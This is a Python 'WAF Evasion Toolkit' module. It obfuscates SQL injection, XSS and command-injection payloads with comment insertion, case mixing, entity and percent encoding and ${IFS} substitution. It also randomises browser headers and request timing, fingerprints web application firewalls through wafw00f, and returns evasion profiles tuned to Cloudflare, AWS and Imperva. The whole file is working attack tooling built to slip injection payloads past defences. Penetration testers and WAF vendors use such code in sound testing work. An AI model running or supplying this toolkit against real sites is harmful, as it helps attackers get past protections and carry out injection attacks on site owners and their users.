"""
WAF Evasion Toolkit – payload obfuscation, header randomization, timing jitter.
Works with any HTTP-based tool wrapper.
"""

import random
import time
import base64
import urllib.parse
from typing import Dict, List, Optional, Union

# ----------------------------------------------------------------------
# User‑Agent pool (2026 real browsers)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.2420.81",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
]

# Common Accept-Language values
ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
]

# ----------------------------------------------------------------------
# Payload obfuscators

def obfuscate_sql(payload: str) -> str:
    """Apply SQLi obfuscation: comment injection, case variation, hex encoding."""
    obf = ''.join(
        c.upper() if random.choice([True, False]) else c.lower()
        for c in payload
    )
    keywords = ['SELECT', 'UNION', 'WHERE', 'AND', 'OR', 'FROM', 'INSERT', 'UPDATE', 'DELETE']
    for kw in keywords:
        if kw in obf.upper():
            parts = obf.split(kw)
            if len(parts) > 1:
                obf = parts[0] + kw + random.choice(['/**/', '/*!*/', '/*!50000*/', '']) + ''.join(parts[1:])
    obf = obf.replace("'", "%27").replace('"', "%22")
    return obf

def obfuscate_xss(payload: str) -> str:
    """XSS obfuscation: HTML entity encoding, double encoding, base64."""
    encoded = []
    for ch in payload:
        if ch in ('<', '>', '"', "'", '(', ')', ';', '=', '+'):
            if random.random() < 0.3:
                encoded.append(f"&#{ord(ch)};")
            elif random.random() < 0.3:
                encoded.append(f"%{ord(ch):02x}")
            else:
                encoded.append(ch)
        else:
            encoded.append(ch)
    return ''.join(encoded)

def obfuscate_rce(payload: str) -> str:
    """RCE payload obfuscation: command substitution, wildcard expansion."""
    if ' ' in payload:
        payload = payload.replace(' ', '${IFS}')
    return payload + random.choice(['', ' #', ' /*'])

def obfuscate_payload(payload: str, payload_type: str = "sql") -> str:
    """Generic obfuscator dispatcher."""
    if payload_type == "sql":
        return obfuscate_sql(payload)
    elif payload_type == "xss":
        return obfuscate_xss(payload)
    elif payload_type == "rce":
        return obfuscate_rce(payload)
    else:
        return payload

# ----------------------------------------------------------------------
# Header randomization

def random_headers(extra: Optional[Dict] = None) -> Dict:
    """Generate a randomized header set."""
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "application/json,text/plain,*/*",
            "text/plain,*/*;q=0.9",
        ]),
        "Accept-Language": random.choice(ACCEPT_LANGUAGES),
        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "br"]),
        "Cache-Control": random.choice(["no-cache", "max-age=0"]),
        "Connection": random.choice(["keep-alive", "close"]),
        "Sec-Ch-Ua": f'"Chromium";v="{random.randint(120, 126)}", "Not A(Brand";v="99"',
        "Sec-Ch-Ua-Mobile": random.choice(["?0", "?1"]),
        "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"']),
        "Sec-Fetch-Dest": random.choice(["document", "empty", "script", "style"]),
        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
        "Sec-Fetch-User": random.choice(["?1", "?0"]),
        "Upgrade-Insecure-Requests": random.choice(["1", "0"]),
    }
    if extra:
        headers.update(extra)
    return headers

# ----------------------------------------------------------------------
# Timing jitter

def random_delay(min_sec: float = 0.1, max_sec: float = 1.5) -> None:
    """Sleep for a random duration between min and max seconds."""
    time.sleep(random.uniform(min_sec, max_sec))

# ----------------------------------------------------------------------
# WAF detection (using wafw00f if installed)

def detect_waf(target: str) -> Optional[str]:
    """Attempt to identify WAF using wafw00f."""
    import subprocess
    try:
        output = subprocess.check_output(
            ["wafw00f", target],
            stderr=subprocess.STDOUT,
            text=True,
            timeout=30
        )
        for line in output.splitlines():
            if "WAF" in line and "detected" in line:
                parts = line.split()
                for part in parts:
                    if part.lower() != "waf" and part.lower() != "detected":
                        return part.strip()
    except (FileNotFoundError, subprocess.TimeoutExpired, subprocess.CalledProcessError):
        return None
    return None

# ----------------------------------------------------------------------
# Evasion profile

def evasion_profile(level: str = "medium", target_waf: Optional[str] = None) -> Dict:
    """Return evasion settings based on WAF type and aggression level."""
    base = {
        "random_headers": True,
        "random_delay_min": 0.1,
        "random_delay_max": 0.5,
        "obfuscate_payloads": True,
        "payload_type": "sql",
        "rotate_user_agent": True,
        "use_random_proxy": False,
        "max_retries": 3,
    }
    if level == "low":
        base["random_delay_max"] = 0.2
    elif level == "high":
        base["random_delay_min"] = 0.5
        base["random_delay_max"] = 2.0
        base["obfuscate_payloads"] = True
        base["max_retries"] = 5
    elif level == "aggressive":
        base["random_delay_min"] = 1.0
        base["random_delay_max"] = 4.0
        base["max_retries"] = 8
        base["obfuscate_payloads"] = True
    if target_waf:
        if "cloudflare" in target_waf.lower():
            base["random_delay_max"] = 3.0
            base["max_retries"] = 6
        elif "aws" in target_waf.lower() or "shield" in target_waf.lower():
            base["random_delay_min"] = 0.5
            base["random_delay_max"] = 1.5
        elif "imperva" in target_waf.lower() or "incapsula" in target_waf.lower():
            base["random_delay_max"] = 2.0
    return base